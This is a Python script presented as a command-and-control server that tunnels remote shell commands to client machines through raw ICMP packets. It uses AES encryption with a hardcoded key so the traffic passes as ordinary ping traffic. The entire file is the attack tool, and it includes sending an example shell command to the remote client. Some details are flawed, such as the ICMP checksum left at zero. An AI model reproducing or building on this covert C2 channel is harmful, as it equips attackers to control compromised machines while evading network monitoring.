import socket
import struct
from Crypto.Cipher import AES

AES_KEY = b"0123456789abcdef"
BUFFER_SIZE = 1024

def pad(data):
    length = AES.block_size - (len(data) % AES.block_size)
    return data + (chr(length) * length).encode()

def unpad(data):
    return data[:-ord(data[len(data)-1:])]

def encrypt(message):
    cipher = AES.new(AES_KEY, AES.MODE_ECB)
    return cipher.encrypt(pad(message))

def decrypt(ciphertext):
    cipher = AES.new(AES_KEY, AES.MODE_ECB)
    return unpad(cipher.decrypt(ciphertext))

def create_icmp_socket():
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    return sock

def receive_icmp(sock):
    packet, addr = sock.recvfrom(BUFFER_SIZE)
    ip_header = packet[:20]
    icmp_header = packet[20:28]
    icmp_payload = packet[28:]
    return icmp_payload, addr

def send_icmp(sock, dest_ip, data):
    icmp_type = 0
    code = 0
    checksum = 0
    identifier = 12345
    sequence_number = 0

    header = struct.pack('bbHHh', icmp_type, code, checksum, identifier, sequence_number)
    packet = header + data
    sock.sendto(packet, (dest_ip, 1))

def main():
    sock = create_icmp_socket()
    print("C2 server is listening for ICMP packets...")

    while True:
        encrypted_command, addr = receive_icmp(sock)
        command = decrypt(encrypted_command)
        print(f"Received command: {command.decode('utf-8')}")

        # Respond with an encrypted acknowledgment
        response = b"ack"
        encrypted_response = encrypt(response)
        send_icmp(sock, addr[0], encrypted_response)

        # Send shell command to client
        shell_command = "ls -la"  # Example shell command
        encrypted_command = encrypt(shell_command.encode('utf-8'))
        send_icmp(sock, addr[0], encrypted_command)

if __name__ == "__main__":
    main()
